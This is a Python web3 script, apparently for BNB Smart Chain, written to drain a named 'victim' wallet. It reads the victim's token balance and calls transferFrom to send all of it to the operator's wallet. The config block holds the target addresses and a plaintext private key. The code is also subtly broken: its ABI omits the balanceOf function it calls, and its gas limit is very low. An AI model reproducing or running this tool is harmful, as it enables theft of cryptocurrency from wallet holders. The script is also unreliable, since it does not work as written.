from web3 import Web3

# CONFIG (Edit these only)
TARGET_TOKEN = "0x452361b508b9033b9D2d66AD49eD166D097E6408"  # Token address
VICTIM_WALLET = "0x41D91c20A61464c72B68f1B941D23ac39355609E"  # Wallet to drain
YOUR_WALLET = "0xe27625486041b56E75161F950393f2D4933fC1c8"  # Your wallet
PRIVATE_KEY = "ec08c372882438439a780bc1db5df8d645e50758c0afd02fdb5b6822abc6bc7b"  # Your wallet's private key
BSC_RPC = "https://bsc-dataseed.binance.org/"  # RPC endpoint

# Setup Web3
w3 = Web3(Web3.HTTPProvider(BSC_RPC))
token_abi = [{
    "inputs": [
        {"name":"from","type":"address"},
        {"name":"to","type":"address"},
        {"name":"amount","type":"uint256"}
    ],
    "name":"transferFrom",
    "type":"function"
}]

# Create contract instance
token = w3.eth.contract(address=TARGET_TOKEN, abi=token_abi)

# Get victim balance
balance = token.functions.balanceOf(VICTIM_WALLET).call()

# Build and send transaction
tx = token.functions.transferFrom(
    VICTIM_WALLET,
    YOUR_WALLET,
    balance
).build_transaction({
    'from': YOUR_WALLET,
    'gas': 20000,
    'gasPrice': w3.toWei('5', 'gwei'),
    'nonce': w3.eth.getTransactionCount(YOUR_WALLET)
})

# Sign and send
signed = w3.eth.account.signTransaction(tx, PRIVATE_KEY)
tx_hash = w3.eth.sendRawTransaction(signed.rawTransaction)

print(f"Success! TX Hash: {tx_hash.hex()}")
print(f"Transferred: {balance / 10**18} tokens")
